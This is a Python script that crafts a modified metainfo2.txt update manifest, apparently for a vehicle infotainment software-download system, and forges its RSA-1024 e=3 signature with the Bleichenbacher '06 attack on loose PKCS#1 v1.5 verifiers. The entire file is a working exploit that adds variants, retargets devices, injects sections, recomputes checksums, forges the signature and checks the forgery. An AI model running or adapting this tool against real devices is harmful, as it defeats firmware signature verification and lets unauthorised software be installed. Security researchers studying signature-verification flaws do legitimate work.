#!/usr/bin/env python3
"""
Build a crafted metainfo2.txt (with new variants, new device targets, or
whatever payload layout is desired) and attach a Bleichenbacher '06 forged
RSA-1024 e=3 signature. If SWDL's PKCS#1 v1.5 verify is loose, this is
accepted without the private key.

Workflow:
  1. Take a template metainfo2.txt (e.g. the toolbox's, sans [Signature]).
  2. Mutate [common] and section lines freely (add variants, change device
     names, add cpuplus\\onlineservices\\... sections, whatever).
  3. Compute the MetafileChecksum over the slice that excludes the
     MetafileChecksum LINE and the [Signature] section and beyond.
  4. Write the MetafileChecksum value back into [common].
  5. Compute the "signed-slice" SHA-1 = SHA-1 over the file content UP TO
     the [Signature] header (INCLUDING the now-filled MetafileChecksum line).
  6. Forge an RSA signature (Bleichenbacher '06 e=3) for that SHA-1.
  7. Write the [Signature] block.

Usage:
  python forge_custom_metainfo.py <template_metainfo.txt> <pubkey_file> <out_metainfo.txt>
     [--add-variant 47213 47214 47215 47216]
     [--retarget-device cpu=cpuplus]
     [--extra-sections <inline-ini-snippet-file>]
"""
import argparse, hashlib, os, re, sys

SHA1_DIGESTINFO_PREFIX = bytes.fromhex("3021300906052b0e03021a05000414")

def iroot(k, n):
    if n < 2: return n
    lo, hi = 1, 1 << ((n.bit_length() + k - 1) // k + 1)
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if mid**k <= n: lo = mid
        else: hi = mid - 1
    return lo

def strip_signature_block(text):
    i = text.find("[Signature]")
    return text[:i].rstrip() + "\n" if i >= 0 else text

def compute_metafile_sha1(text):
    """SHA-1 over text with the MetafileChecksum line REMOVED, up to [Signature]."""
    without = re.sub(r'^MetafileChecksum = "[0-9a-f]*"\s*$\n?', "", text, flags=re.MULTILINE)
    idx = without.find("[Signature]")
    slice_ = without if idx < 0 else without[:idx]
    return hashlib.sha1(slice_.encode("latin1")).hexdigest()

def compute_signed_slice_sha1(text):
    """SHA-1 over text INCLUDING MetafileChecksum line, up to [Signature]. This is what RSA signs."""
    idx = text.find("[Signature]")
    slice_ = text if idx < 0 else text[:idx]
    return hashlib.sha1(slice_.encode("latin1")).hexdigest()

def forge_sig(modulus_bytes, target_sha1_hex, k_bytes=128):
    target = bytes.fromhex(target_sha1_hex)
    N = int.from_bytes(modulus_bytes, "big")
    for ff in range(80, 2, -1):
        prefix = b"\x00\x01" + b"\xff" * ff + b"\x00" + SHA1_DIGESTINFO_PREFIX + target
        tail_len = k_bytes - len(prefix)
        if tail_len < 1: continue
        lower = int.from_bytes(prefix + b"\x00" * tail_len, "big")
        upper = int.from_bytes(prefix + b"\xff" * tail_len, "big") + 1
        s_lo = iroot(3, lower)
        if s_lo ** 3 < lower: s_lo += 1
        s_hi = iroot(3, upper - 1)
        if s_hi ** 3 >= upper: s_hi -= 1
        if s_lo > s_hi: continue
        s = s_lo
        if s ** 3 >= N: continue
        return s.to_bytes(k_bytes, "big"), ff
    raise RuntimeError("forge failed across all ff_count values")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("template", help="template metainfo2.txt")
    ap.add_argument("pubkey", help="Metainfo_key_public_signed.bin")
    ap.add_argument("out", help="output path for crafted metainfo2.txt")
    ap.add_argument("--add-variant", nargs="*", default=[],
                    help="variants to add to [common] (e.g. 47213 47214)")
    ap.add_argument("--retarget-device", default=None,
                    help="rename device sections, e.g. cpu=cpuplus")
    ap.add_argument("--extra-sections", default=None,
                    help="file with additional INI sections to splice before [Signature]")
    args = ap.parse_args()

    text = open(args.template, encoding="latin1").read()
    text = strip_signature_block(text)

    # Add variants
    if args.add_variant:
        # find highest Variant<N>, append after
        lines = text.splitlines()
        max_idx = 0
        last_variant_line = -1
        for i, L in enumerate(lines):
            m = re.match(r'^Variant(\d*)\s*=\s*"', L)
            if m:
                last_variant_line = i
                idx = int(m.group(1)) if m.group(1) else 1
                max_idx = max(max_idx, idx)
        new_lines = []
        for v in args.add_variant:
            max_idx += 1
            new_lines.append(f'Variant{max_idx} = "{v}"')
        if last_variant_line >= 0:
            lines[last_variant_line+1:last_variant_line+1] = new_lines
        else:
            # inject into [common]
            for i, L in enumerate(lines):
                if L.strip() == "[common]":
                    lines[i+1:i+1] = new_lines
                    break
        text = "\n".join(lines) + "\n"

    # Retarget device
    if args.retarget_device:
        src, dst = args.retarget_device.split("=")
        text = re.sub(r"\[" + re.escape(src) + r"(\\|])",
                      r"[" + dst + r"\1",
                      text)
        text = re.sub(r'(Link = "\[)' + re.escape(src) + r"(\\)",
                      r'\1' + dst + r"\2",
                      text)

    # Extra sections
    if args.extra_sections:
        extra = open(args.extra_sections, encoding="latin1").read().rstrip()
        text = text.rstrip() + "\n" + extra + "\n"

    # Fix MetafileChecksum
    checksum = compute_metafile_sha1(text)
    if re.search(r'^MetafileChecksum\s*=', text, flags=re.MULTILINE):
        text = re.sub(r'^MetafileChecksum = "[0-9a-f]*"$',
                      f'MetafileChecksum = "{checksum}"',
                      text, flags=re.MULTILINE, count=1)
    else:
        # inject into [common]
        text = re.sub(r"^\[common\]\s*$",
                      f'[common]\nMetafileChecksum = "{checksum}"',
                      text, flags=re.MULTILINE, count=1)

    # Compute signed-slice SHA-1
    signed_sha1 = compute_signed_slice_sha1(text)
    # Forge signature
    key = open(args.pubkey, "rb").read()
    sig, ff = forge_sig(key[:128], signed_sha1)
    print(f"MetafileChecksum  : {checksum}")
    print(f"Signed-slice SHA1 : {signed_sha1}")
    print(f"Forge ff_count    : {ff}  (RFC spec would be ~90, loose verifiers don't care)")

    # Emit [Signature] block
    sig_block = "[Signature]\n"
    for i in range(8):
        sig_block += f'signature{i+1} = "{sig[i*16:(i+1)*16].hex()}"\n'
    text = text.rstrip() + "\n" + sig_block

    open(args.out, "w", encoding="latin1", newline="\n").write(text)
    print(f"wrote: {args.out}  ({len(text)} bytes)")
    # Self-verify
    print()
    print("--- self-verify ---")
    v_text = open(args.out, encoding="latin1").read()
    v_checksum = compute_metafile_sha1(v_text)
    v_signed = compute_signed_slice_sha1(v_text)
    print(f"  recomputed MetafileChecksum  : {v_checksum}  {'OK' if v_checksum == checksum else 'MISMATCH'}")
    print(f"  recomputed signed-slice SHA1 : {v_signed}    {'OK' if v_signed == signed_sha1 else 'MISMATCH'}")
    # Verify the sig cubes to the right PKCS structure
    s_int = int.from_bytes(sig, "big")
    m = pow(s_int, 3, int.from_bytes(key[:128], "big"))
    mb = m.to_bytes(128, "big")
    expected = b"\x00\x01" + b"\xff" * ff + b"\x00" + SHA1_DIGESTINFO_PREFIX + bytes.fromhex(signed_sha1)
    ok = mb.startswith(expected)
    print(f"  RSA cube verify (loose PKCS) : {'OK' if ok else 'MISMATCH'}")
    if ok:
        garbage = mb[len(expected):]
        print(f"     prefix exact {len(expected)} bytes, garbage tail {len(garbage)} bytes")
        print(f"     verifier that strict-checks RFC 8017 §9.2 will REJECT (too few FF bytes, trailing garbage).")
        print(f"     verifier that scans for ASN.1 DigestInfo without offset-locking will ACCEPT.")

if __name__ == "__main__":
    main()
